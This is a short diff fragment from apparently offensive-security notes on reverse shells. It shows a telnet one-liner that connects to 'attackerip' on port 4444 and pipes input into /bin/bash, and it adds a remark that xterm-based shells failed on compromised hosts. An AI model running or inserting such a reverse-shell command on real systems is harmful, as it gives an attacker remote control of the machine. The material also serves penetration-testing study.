@@ -52,3 +52,8 @@ This is a pretty obscure / esoteric method but there might be a chance you might
 Or use a bunch of piping
      
     telnet attackerip 4444 | /bin/bash | telnet 127.0.0.1 4444   
+
+There are other methods such as xterm but I have never got it to work as most of the boxes I popped never had xorg server installed.
+    
+    
+    
